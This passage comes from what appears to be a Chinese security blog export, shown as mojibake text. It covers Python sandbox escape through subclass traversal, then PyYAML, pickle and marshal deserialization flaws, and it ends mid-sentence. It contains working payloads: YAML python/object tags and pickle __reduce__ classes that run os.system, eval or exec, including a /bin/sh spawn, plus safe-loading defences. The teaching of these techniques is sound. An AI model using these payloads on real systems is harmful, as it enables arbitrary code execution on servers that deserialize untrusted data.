\u0026#39;uuid\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;warnings\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;wave\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;weakref\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;webbrowser\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;xdrlib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;zipapp\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;zipfile\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;]} target_modules = [\u0026#39;os\u0026#39;, \u0026#39;platform\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;timeit\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;] target_functions = [\u0026#39;__import__\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;execfile\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;open\u0026#39;] all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions)) all_modules = list(set(list(find_modules.keys()) + target_modules)) subclasses = ().__class__.__bases__[0].__subclasses__() sub_name = [s.__name__ for s in subclasses] # ç¬¬ä¸€ç§éå†,å¦‚:().__class__.__bases__[0].__subclasses__()[40](\u0026#39;./test.py\u0026#39;).read() print(\u0026#39;----------1-----------\u0026#39;) for i, s in enumerate(sub_name): for f in all_targets: if f == s: if f in target_functions: print(i, f) elif f in all_modules: target = find_modules[f] sub_dict = subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target) print(\u0026#39;----------2-----------\u0026#39;) # ç¬¬äºŒç§éå†,å¦‚:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__[\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;].__dict__[\u0026#39;sy\u0026#39;+\u0026#39;stem\u0026#39;](\u0026#39;ls\u0026#39;) for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__ for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: pass print(\u0026#39;----------3-----------\u0026#39;) # ç¬¬ä¸‰ç§éå†,å¦‚:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39;) for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target = find_modules.get(f) sub_dict = v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: pass print(\u0026#39;----------4-----------\u0026#39;) # ç¬¬å››ç§éå†:å¦‚:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;) # \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;\u0026gt;ç±»å¾ˆç‰¹æ®Šï¼Œåœ¨å†…éƒ¨å®šä¹‰äº†_module=sys.modules[\u0026#39;warnings\u0026#39;]ï¼Œç„¶åwarningsæ¨¡å—åŒ…å«æœ‰__builtins__ï¼Œä¸å…·æœ‰é€šç”¨æ€§ï¼Œæœ¬è´¨ä¸Šè·Ÿç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ for i, sub in enumerate(subclasses): try: more = sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass å‚è€ƒï¼š\nä¸€æ–‡çœ‹æ‡‚Pythonæ²™ç®±é€ƒé€¸\npython æ²™ç®±é€ƒé€¸ä¸SSTI\nCTF Wiki Pythonæ²™ç®±é€ƒé€¸ Pythonå®‰å…¨å­¦ä¹ â€”Pythonæ²™ç›’é€ƒé€¸\nPythonæ²™ç®±é€ƒé€¸æ€»ç»“\nPython æ²™ç›’ç»•è¿‡ ","date":"2025-06-01T10:29:30+08:00","permalink":"https://Oight.github.io/p/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","title":"Pythonæ²™ç®±é€ƒé€¸"},{"content":"Python ååºåˆ—åŒ–æ¼æ´\rä»€ä¹ˆæ˜¯Pythonçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\rä»€ä¹ˆæ˜¯Pythonçš„åºåˆ—åŒ–\rä¼—æ‰€å‘¨çŸ¥ï¼ŒPythonæ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„è¯­è¨€ã€‚åœ¨Pythonä¸­ï¼Œä¸€åˆ‡çš†å¯¹è±¡ã€‚æ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå‡½æ•°ï¼Œæ¨¡å—ç­‰ç­‰ï¼Œéƒ½æ˜¯å¯¹è±¡ã€‚å¯¹è±¡çš„æœ¬è´¨æ˜¯å†…å­˜ä¸­çš„ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ŒåŒ…å«å±æ€§ï¼ˆæ•°æ®ï¼‰å’Œæ–¹æ³•ï¼ˆæ“ä½œï¼‰ã€‚\nç”±äºPythonä¸­å¯¹è±¡çš„å½¢å¼å¤šç§å¤šæ ·ï¼Œå˜åŒ–ä¸‡åƒï¼Œåœ¨å­˜å‚¨æ—¶æŒ‰ç…§åŸæœ¬çš„å½¢å¼æ¥å­˜å‚¨è¿‡äºåºå¤§ä¸”éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦æŠŠPythonå¯¹è±¡è½¬æ¢ä¸ºå¯å­˜å‚¨æˆ–å¯ä¼ è¾“çš„æ ‡å‡†åŒ–æ ¼å¼ã€‚å°†Pythonå¯¹è±¡è½¬æ¢ä¸ºå¯å­˜å‚¨æˆ–ä¼ è¾“çš„æ ‡å‡†åŒ–æ ¼å¼ï¼ˆå¦‚å­—èŠ‚æµã€å­—ç¬¦ä¸²ï¼‰çš„è¿‡ç¨‹ï¼Œå°±å«åšPythonçš„åºåˆ—åŒ–ã€‚\nä»€ä¹ˆæ˜¯Pythonçš„ååºåˆ—åŒ–\ræ—¢ç„¶ä¸ºäº†å­˜å‚¨å’Œä¼ è¾“æ–¹ä¾¿ï¼Œå°†Pythonå¯¹è±¡é€šè¿‡åºåˆ—åŒ–çš„æ–¹å¼è½¬æ¢æˆäº†ä¸€ç§æ ‡å‡†åŒ–çš„æ ¼å¼ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºæ‰§è¡Œæ—¶ï¼Œæˆ‘ä»¬å°±éœ€è¦æŠŠæ ‡å‡†åŒ–æ ¼å¼è¿˜åŸä¸ºPythonå¯¹è±¡ï¼Œè€Œè¿™ä¸ªè¿‡ç¨‹ï¼Œå°±å«åšPythonçš„ååºåˆ—åŒ–ã€‚\nåºåˆ—åŒ–çš„æœ¬è´¨\råºåˆ—åŒ–çš„æœ¬è´¨æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€æˆ–æ•°æ®ç»“æ„è½¬æ¢ä¸ºä¸€ç§é€šç”¨æ ¼å¼ï¼ˆå¦‚äºŒè¿›åˆ¶ï¼ŒJSONï¼ŒXMLï¼‰ï¼Œä½¿å…¶å¯ä»¥ä¿å­˜åˆ°æ–‡ä»¶ã€æ•°æ®åº“æˆ–é€šè¿‡ç½‘ç»œä¼ è¾“ã€‚ ååºåˆ—åŒ–æ˜¯é€†è¿‡ç¨‹ï¼Œå°†åºåˆ—åŒ–åçš„æ•°æ®è¿˜åŸä¸ºåŸå§‹å¯¹è±¡ã€‚ Pythonä¸­åºåˆ—åŒ–çš„å®ç°è¿‡ç¨‹\rPythonåºå¤§çš„åº“ï¼Œä¸ºPythonå¼ºå¤§çš„åŠŸèƒ½å®ç°æä¾›æ”¯æ’‘å’Œä¿éšœã€‚åŒæ ·çš„ï¼ŒPythonä¸­åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å®ç°ä¹Ÿæ˜¯é€šè¿‡ä¸€äº›åº“å’Œæ¨¡å—æ¥å®ç°çš„ã€‚\npickleæ¨¡å— ä½œä¸ºPythonçš„åŸç”Ÿæ¨¡å—ï¼Œpickleæ”¯æŒå‡ ä¹æ‰€æœ‰çš„Pythonå¯¹è±¡ ä½¿ç”¨pickleè¿›è¡Œåºåˆ—åŒ–ç”Ÿæˆçš„æ˜¯äºŒè¿›åˆ¶æ ¼å¼æ•°æ® ä»£ç ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 import pickle data = {\u0026#34;name\u0026#34;: \u0026#34;Alice\u0026#34;, \u0026#34;age\u0026#34;: 30} serialized_data = pickle.dumps(data) # åºåˆ—åŒ–ä¸ºå­—èŠ‚æµ # ä¿å­˜åˆ°æ–‡ä»¶ with open(\u0026#34;data.pkl\u0026#34;, \u0026#34;wb\u0026#34;) as f: pickle.dump(data, f) jsonæ¨¡å— jsonå¯ä»¥ç”Ÿæˆäººç±»å¯è¯»çš„JSONå­—ç¬¦ä¸² ä½†jsonåªæ”¯æŒåŸºç¡€ç±»å‹ï¼ˆå­—å…¸ã€åˆ—è¡¨ã€å­—ç¬¦ä¸²ã€æ•°å­—ç­‰ï¼‰ï¼Œä¸æ”¯æŒPythonç‰¹æœ‰å¯¹è±¡ï¼ˆå¦‚ç±»å®ä¾‹ï¼‰çš„åºåˆ—åŒ–ã€‚ ä»£ç ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 import json data = {\u0026#34;name\u0026#34;: \u0026#34;Bob\u0026#34;, \u0026#34;age\u0026#34;: 25} json_str = json.dumps(data) # åºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸² # ä¿å­˜åˆ°æ–‡ä»¶ with open(\u0026#34;data.json\u0026#34;, \u0026#34;w\u0026#34;) as f: json.dump(data, f) PyYAMLåº“ YAMLï¼ˆYAML Ainâ€™t Markup Languageï¼‰æ˜¯ä¸€ç§äººç±»å¯è¯»çš„æ•°æ®åºåˆ—åŒ–æ ¼å¼ï¼Œå¸¸ç”¨äºé…ç½®æ–‡ä»¶å’Œæ•°æ®äº¤æ¢ã€‚Python ä¸­é€šè¿‡ PyYAML åº“æ”¯æŒ YAMLã€‚ åºåˆ—åŒ–å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import yaml data = { \u0026#34;name\u0026#34;: \u0026#34;Alice\u0026#34;, \u0026#34;age\u0026#34;: 30, \u0026#34;skills\u0026#34;: [\u0026#34;Python\u0026#34;, \u0026#34;YAML\u0026#34;], \u0026#34;address\u0026#34;: {\u0026#34;city\u0026#34;: \u0026#34;Shanghai\u0026#34;, \u0026#34;zip\u0026#34;: 200000} } # åºåˆ—åŒ–ä¸ºYAMLå­—ç¬¦ä¸² yaml_str = yaml.dump(data, default_flow_style=False) print(yaml_str) è¾“å‡ºï¼š\n1 2 3 4 5 6 7 8 address: city: Shanghai zip: 200000 age: 30 name: Alice skills: - Python - YAML ä¿å­˜/è¯»å–æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 # å†™å…¥æ–‡ä»¶ with open(\u0026#34;data.yaml\u0026#34;, \u0026#34;w\u0026#34;) as f: yaml.dump(data, f) # è¯»å–æ–‡ä»¶ with open(\u0026#34;data.yaml\u0026#34;, \u0026#34;r\u0026#34;) as f: loaded_from_file = yaml.safe_load(f) ä½¿ç”¨ Protocol Buffersï¼ˆprotobufï¼‰å®ç°åºåˆ—åŒ– Protocol Buffers æ˜¯ Google å¼€å‘çš„é«˜æ•ˆäºŒè¿›åˆ¶åºåˆ—åŒ–æ ¼å¼ï¼Œé€‚åˆé«˜æ€§èƒ½é€šä¿¡å’Œè·¨è¯­è¨€æ•°æ®äº¤æ¢ã€‚éœ€é¢„å…ˆå®šä¹‰æ•°æ®ç»“æ„ï¼ˆ.proto æ–‡ä»¶ï¼‰ã€‚ Pythonä¸­ååºåˆ—åŒ–å®ç°è¿‡ç¨‹\råœ¨ä»¥ä¸ŠPythonåºåˆ—åŒ–å®ç°è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨pickleæ¨¡å—å’ŒPyyamlåº“ï¼Œåœ¨å®ç°ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å­˜åœ¨å®‰å…¨é£é™©ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ä»–ä»¬çš„ååºåˆ—åŒ–è¿‡ç¨‹æ˜¯å¦‚ä½•å®ç°çš„\nYAML ååºåˆ—åŒ–å®ç°\rYAMLçš„ååºåˆ—åŒ–è¿‡ç¨‹é€šè¿‡PyYAMLåº“å®ç°ï¼Œæœ¬è´¨æ˜¯å°†YAMLæ–‡æœ¬è§£æä¸ºPythonå¯¹è±¡ã€‚é»˜è®¤çš„ yaml.load() æ–¹æ³•æ”¯æŒåŠ¨æ€æ„é€ Pythonå¯¹è±¡ï¼ˆåŒ…æ‹¬ç±»å®ä¾‹ï¼‰ï¼Œä½†è¿™ä¹Ÿå¸¦æ¥äº†å®‰å…¨é£é™©ã€‚\nååºåˆ—åŒ–æ­¥éª¤ï¼š\r1.å®‰è£…ä¾èµ–\n1 pip install pyyaml 2.åŸºç¡€ååºåˆ—åŒ–ï¼ˆå®‰å…¨æ¨¡å¼ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import yaml # YAML æ–‡æœ¬ï¼ˆä»…åŒ…å«åŸºç¡€ç±»å‹ï¼‰ yaml_text = \u0026#34;\u0026#34;\u0026#34; name: Alice age: 30 skills: - Python - YAML \u0026#34;\u0026#34;\u0026#34; # å®‰å…¨ååºåˆ—åŒ–ï¼šä»…è§£æåŸºæœ¬ç±»å‹ï¼ˆå­—å…¸ã€åˆ—è¡¨ç­‰ï¼‰ data = yaml.safe_load(yaml_text) print(data[\u0026#34;name\u0026#34;]) # è¾“å‡º Alice 3.åŠ¨æ€å¯¹è±¡ååºåˆ—åŒ–ï¼ˆå±é™©ï¼ï¼‰ï¼š\nYAML å¯ä»¥é€šè¿‡æ ‡ç­¾ï¼ˆ!!python/objectï¼‰åŠ¨æ€æ„é€  Python å¯¹è±¡ï¼Œä¾‹å¦‚ï¼š\n1 2 # æ¶æ„ç¤ºä¾‹ï¼šååºåˆ—åŒ–æ—¶æ‰§è¡Œä»£ç  !!python/object/apply:os.system [\u0026#34;echo \u0026#39;Hacked!\u0026#39;\u0026#34;] å±é™©çš„ååºåˆ—åŒ–ä»£ç ï¼š\n1 2 3 4 5 # ä¸è¦å¯¹ä¸å¯ä¿¡æ•°æ®ä½¿ç”¨ yaml.load()ï¼ malicious_yaml = \u0026#34;\u0026#34;\u0026#34; !!python/object/apply:os.system [\u0026#34;echo \u0026#39;Hacked!\u0026#39;\u0026#34;] \u0026#34;\u0026#34;\u0026#34; yaml.load(malicious_yaml, Loader=yaml.UnsafeLoader) # è¾“å‡º Hacked! å®‰å…¨å®è·µ\nå§‹ç»ˆä½¿ç”¨ yaml.safe_load()ï¼šä»…è§£æåŸºç¡€ç±»å‹ï¼ˆå­—å…¸ã€åˆ—è¡¨ã€å­—ç¬¦ä¸²ã€æ•°å­—ï¼‰ï¼Œç¦æ­¢åŠ¨æ€å¯¹è±¡æ„é€ ã€‚\nç¦ç”¨å±é™©æ ‡ç­¾ï¼šè‹¥å¿…é¡»è§£æå¯¹è±¡ï¼Œéœ€è‡ªå®šä¹‰åŠ è½½å™¨ï¼Œè¿‡æ»¤å…è®¸çš„ç±»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 from yaml import SafeLoader, Node, Constructor class RestrictedLoader(SafeLoader): def construct_python_object(self, node: Node): raise yaml.ConstructorError(\u0026#34;ç¦æ­¢åŠ¨æ€å¯¹è±¡æ„é€ \u0026#34;) # æ³¨å†Œè‡ªå®šä¹‰åŠ è½½å™¨ RestrictedLoader.add_constructor( \u0026#34;tag:yaml.org,2002:python/object\u0026#34;, RestrictedLoader.construct_python_object ) data = yaml.load(yaml_text, Loader=RestrictedLoader) # å®‰å…¨åŠ è½½ Pickle ååºåˆ—åŒ–å®ç°\rPickle çš„ååºåˆ—åŒ–é€šè¿‡ pickle.load() æˆ– pickle.loads() å®ç°ï¼Œå…¶åº•å±‚ä¼šé‡å»ºå¯¹è±¡çš„å®Œæ•´çŠ¶æ€ï¼ŒåŒ…æ‹¬è°ƒç”¨__reduce__æ–¹æ³•ï¼ˆè‹¥å­˜åœ¨ï¼‰ï¼Œä»è€Œå¯èƒ½æ‰§è¡Œä»»æ„ä»£ç ã€‚\nååºåˆ—åŒ–æ­¥éª¤ï¼š\r1.åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼š\n1 2 3 4 5 6 7 8 9 import pickle class User: def __init__(self, name): self.name = name # åºåˆ—åŒ–å¯¹è±¡ user = User(\u0026#34;Alice\u0026#34;) serialized = pickle.dumps(user) 2.åŸºç¡€ååºåˆ—åŒ–:\n1 2 3 # ååºåˆ—åŒ– loaded_user = pickle.loads(serialized) print(loaded_user.name) # è¾“å‡º Alice 3.æ¶æ„ååºåˆ—åŒ–ç¤ºä¾‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import pickle import os class Malicious: def __reduce__(self): # ååºåˆ—åŒ–æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ return (os.system, (\u0026#34;echo \u0026#39;Hacked!\u0026#39;\u0026#34;,)) # ç”Ÿæˆæ¶æ„ payload payload = pickle.dumps(Malicious()) # ååºåˆ—åŒ–è§¦å‘æ”»å‡» pickle.loads(payload) # è¾“å‡º Hacked! å®‰å…¨é£é™©æ ¹æº:\n__reduce__æ–¹æ³•ï¼šåœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œè¿”å›ä¸€ä¸ªå…ƒç»„ï¼ˆå‡½æ•°ã€å‚æ•°ï¼‰ï¼Œæ‰§è¡Œå‡½æ•°ã€‚\nä»»æ„ä»£ç æ‰§è¡Œï¼šæ”»å‡»è€…å¯æ„é€ æ¶æ„__reduce__æ–¹æ³•ï¼Œæ‰§è¡Œå±é™©æ“ä½œï¼ˆå¦‚åˆ é™¤æ–‡ä»¶ã€åå¼¹Shellï¼‰ã€‚\né˜²å¾¡æ–¹æ³•\né¿å…ååºåˆ—åŒ–ä¸å¯ä¿¡æ•°æ®ï¼šæ°¸è¿œä¸è¦å¯¹æ¥æºæœªçŸ¥çš„æ•°æ®ä½¿ç”¨ pickle.load()ã€‚\né™åˆ¶å…è®¸çš„ç±»ï¼ˆç™½åå•ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import pickle class SafeUnpickler(pickle.Unpickler): allowed_classes = {\u0026#34;__main__.User\u0026#34;} # ä»…å…è®¸Userç±» def find_class(self, module, name): full_name = f\u0026#34;{module}.{name}\u0026#34; if full_name not in self.allowed_classes: raise pickle.UnpicklingError(f\u0026#34;ç¦æ­¢çš„ç±»: {full_name}\u0026#34;) return super().find_class(module, name) # å®‰å…¨ååºåˆ—åŒ– safe_data = SafeUnpickler(io.BytesIO(serialized)).load() ååºåˆ—åŒ–æ¼æ´çš„æˆå› \ræˆ‘ä»¬ä¸Šé¢æåˆ°äº†YAMLå’Œpickleçš„ååºåˆ—åŒ–è¿‡ç¨‹ä»¥åŠä»–ä»¬çš„é£é™©æ¼æ´ï¼Œè¿™é‡Œæ¥æ€»ç»“ä¸€ä¸‹ã€‚\nYAMLçš„ååºåˆ—åŒ–æ¼æ´\ré€ æˆYAMLååºåˆ—åŒ–æ¼æ´çš„åŸå› æ˜¯ç”±äºè¿‡äºç›¸ä¿¡YAMLæ•°æ®æ¥æºï¼Œåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä½¿ç”¨äº†ä¸€äº›å±é™©æ ‡ç­¾ï¼Œä½¿å¾—æ”»å‡»è€…åˆ©ç”¨è¿™äº›æ ‡ç­¾ä½¿ç”¨ yaml.load() æ–¹æ³•æ¥åŠ¨æ€æ„é€ Pythonå¯¹è±¡ï¼Œå¯¼è‡´ç¨‹åºé”™è¯¯åœ°è°ƒç”¨äº† os.system() è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nPickle çš„ååºåˆ—åŒ–æ¼æ´\ré€ æˆpickleååºåˆ—åŒ–æ¼æ´çš„åŸå› æ˜¯åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨è°ƒç”¨__reduce__æ–¹æ³•çš„å¯èƒ½ï¼Œè¿™ä¸€æ–¹æ³•ä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ç±»ï¼Œåœ¨__reduce__ä¸­è¿”å›ä¸€ä¸ªå±é™©çš„å¯è°ƒç”¨å¯¹è±¡ï¼ˆå¦‚ os.systemï¼‰ï¼Œä»è€Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œã€‚\nä¸ºä»€ä¹ˆ__reduce__å±é™©ï¼Ÿ\rå®Œå…¨æ§åˆ¶ååºåˆ—åŒ–é€»è¾‘ï¼š __reduce__å…è®¸æ”»å‡»è€…æŒ‡å®šä»»æ„å‡½æ•°å’Œå‚æ•°ï¼Œä¸”ååºåˆ—åŒ–æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚\nç»•è¿‡å¯¹è±¡çŠ¶æ€é™åˆ¶ï¼š å³ä½¿ç›®æ ‡ä»£ç ä¸­æ²¡æœ‰æ¶æ„ç±»ï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥æ„é€ åŒ…å«å±é™©å‡½æ•°çš„__reduce__ã€‚\nPythonååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨\ræˆ‘ä»¬å·²ç»è®¨è®ºè¿‡Pythonä¸­çš„ååºåˆ—åŒ–æ¼æ´æ˜¯ç”±äºé”™è¯¯ä½¿ç”¨yaml.load()ã€å±é™©æ ‡ç­¾å’Œ__reduce__ï¼Œå¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ä¹Ÿç€çœ¼äºæ­¤ã€‚\nyamlæ¼æ´çš„åˆ©ç”¨\rå¯¹äºPyYaml\u0026lt;5.1ç‰ˆæœ¬ä¸‹çš„æ¼æ´ï¼Œå…¶ä¸»è¦åŸå› ä¸»è¦å‡ºç°åœ¨ä¸‹é¢äº”ä¸ªpythonæ ‡ç­¾ï¼š\n1 2 3 4 5 python/name python/module python/object python/object/new python/object/apply æ¼æ´æˆå› ï¼š\nç”±äºä¸Šé¢æåˆ°çš„äº”ä¸ªæ ‡ç­¾ï¼Œåœ¨constructor.pyæ–‡ä»¶è¢«åŠ è½½å™¨è§£æå¯¼è‡´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¿™ç±»æ ‡ç­¾å¯ä»¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œä»¥åŠéªŒè¯ç»•è¿‡ç­‰æ¼æ´çš„åˆ©ç”¨ã€‚\npayloadï¼š\n1 2 3 4 !!python/object/apply:os.system [\u0026#34;calc.exe\u0026#34;] !!python/object/new:os.system [\u0026#34;calc.exe\u0026#34;] !!python/object/new:subprocess.check_output [[\u0026#34;calc.exe\u0026#34;]] !!python/object/apply:subprocess.check_output [[\u0026#34;calc.exe\u0026#34;]] åœ¨5.1ä¹‹åçš„yamlä¸­loadå‡½æ•°è¢«é™åˆ¶ä½¿ç”¨äº†ï¼Œä¼šè¢«è­¦å‘Šæé†’åŠ ä¸Šä¸€ä¸ªå‚æ•° Loader\né’ˆå¯¹ä¸åŒçš„éœ€è¦ï¼Œé€‰æ‹©ä¸åŒçš„åŠ è½½å™¨ï¼Œæœ‰ä»¥ä¸‹å‡ ç§åŠ è½½å™¨\n1 2 3 4 5 6 7 8 9 BaseConstructorï¼šä»…åŠ è½½æœ€åŸºæœ¬çš„YAML SafeConstructorï¼šå®‰å…¨åŠ è½½Yamlè¯­è¨€çš„å­é›†ï¼Œå»ºè®®ç”¨äºåŠ è½½ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼ˆsafe_load) FullConstructorï¼šåŠ è½½çš„æ¨¡å—å¿…é¡»ä½äº sys.modules ä¸­ï¼ˆè¯´æ˜ç¨‹åºå·²ç» import è¿‡äº†æ‰è®©åŠ è½½ï¼‰ã€‚è¿™ä¸ªæ˜¯é»˜è®¤çš„åŠ è½½å™¨ã€‚ UnsafeConstructorï¼ˆä¹Ÿç§°ä¸ºLoaderå‘åå…¼å®¹æ€§ï¼‰ï¼šåŸå§‹çš„Loaderä»£ç ï¼Œå¯ä»¥é€šè¿‡ä¸å—ä¿¡ä»»çš„æ•°æ®è¾“å…¥è½»æ¾åˆ©ç”¨ï¼ˆunsafe_loadï¼‰ Constructorï¼šç­‰åŒäºUnsafeConstructor å¦‚æœè¯´æŒ‡å®šçš„åŠ è½½å™¨æ˜¯UnsafeConstructor æˆ–è€…Constructorï¼Œé‚£ä¹ˆåˆ©ç”¨æ–¹å¼å°±ç…§æ—§\npayload\næˆ‘ä»¬å¯ä»¥ç”¨pythonçš„å†…ç½®å‡½æ•°evalï¼ˆæˆ–è€…execï¼‰æ¥æ‰§è¡Œä»£ç ï¼Œç”¨mapæ¥è§¦å‘å‡½æ•°æ‰§è¡Œï¼Œç”¨tupleå°†mapå¯¹è±¡è½¬åŒ–ä¸ºå…ƒç»„è¾“å‡ºæ¥ï¼ˆå½“ç„¶ç”¨listã€frozensetã€byteséƒ½å¯ä»¥ï¼‰ï¼Œç”¨pythonå†™å‡ºæ¥å¦‚ä¸‹\n1 tuple(map(eval, [\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34;])) å˜ä¸ºyaml\n1 2 3 4 5 6 yaml.load(\u0026#34;\u0026#34;\u0026#34; !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34;] \u0026#34;\u0026#34;\u0026#34;) é™¤æ­¤ä¹‹å¤–ç½‘ä¸Šè¿˜æœ‰å¾ˆå¤šå¤§ä½¬æœ‰å…¶ä»–çš„payload\n1 2 3 4 #åˆ›å»ºäº†ä¸€ä¸ªç±»å‹ä¸ºzçš„æ–°å¯¹è±¡,è€Œå¯¹è±¡ä¸­extendå±æ€§åœ¨åˆ›å»ºæ—¶ä¼šè¢«è°ƒç”¨,å‚æ•°ä¸ºlistitemså†…çš„å‚æ•° !!python/object/new:type args: [\u0026#34;z\u0026#34;, !!python/tuple [], {\u0026#34;extend\u0026#34;: !!python/name:exec }] listitems: \u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34; 1 2 3 4 5 6 7 8 9 #æŠ¥é”™ä½†æ˜¯æ‰§è¡Œäº† - !!python/object/new:str args: [] state: !!python/tuple - \u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34; - !!python/object/new:staticmethod args: [0] state: update: !!python/name:exec 1 2 3 4 5 6 - !!python/object/new:yaml.MappingNode listitems: !!str \u0026#39;!!python/object/apply:subprocess.Popen [whoami]\u0026#39; state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load å‚è€ƒï¼š\nPyYamlååºåˆ—åŒ–æ¼æ´\nPyYAMLååºåˆ—åŒ–æ¼æ´\nPickle æ¼æ´åˆ©ç”¨\ræ¼æ´å¸¸è§å‡ºç°åœ°æ–¹\né€šå¸¸åœ¨è§£æè®¤è¯token, sessionçš„æ—¶å€™. ç°åœ¨å¾ˆå¤š Web æœåŠ¡éƒ½ä½¿ç”¨redisã€mongodbã€memcachedç­‰æ¥å­˜å‚¨sessionç­‰çŠ¶æ€ä¿¡æ¯. å¯èƒ½å°†å¯¹è±¡ Pickle åå­˜å‚¨æˆç£ç›˜æ–‡ä»¶. å¯èƒ½å°†å¯¹è±¡ Pickle ååœ¨ç½‘ç»œä¸­ä¼ è¾“. åŸºæœ¬ Payload\n1 2 3 4 5 6 7 8 9 10 import os import pickle class Demo(object): def __reduce__(self): shell = \u0026#39;/bin/sh\u0026#39; return (os.system,(shell,)) demo = Demo() pickle.loads(pickle.dumps(demo)) Marshal ååºåˆ—åŒ–\rç”±äºpickleæ— æ³•åºåˆ—åŒ–codeå¯¹è±¡, å› æ­¤åœ¨python2.6åå¢åŠ äº†ä¸€ä¸ªmarshalæ¨¡å—æ¥å¤„ç†codeå¯¹è±¡çš„åºåˆ—åŒ–é—®é¢˜.\n1 2 3 4 5 6 7 8 9 import base64 import marshal def demo(): import os os.system(\u0026#39;/bin/sh\u0026#39;) code_serialized = base64.b64encode(marshal.dumps(demo())) print(code_serialized) ä½†æ˜¯marshalä¸èƒ½ç›´æ¥ä½¿ç”¨__reduce__, å› ä¸ºreduceæ˜¯åˆ©ç”¨è°ƒç”¨æŸä¸ªcallableå¹¶ä¼ 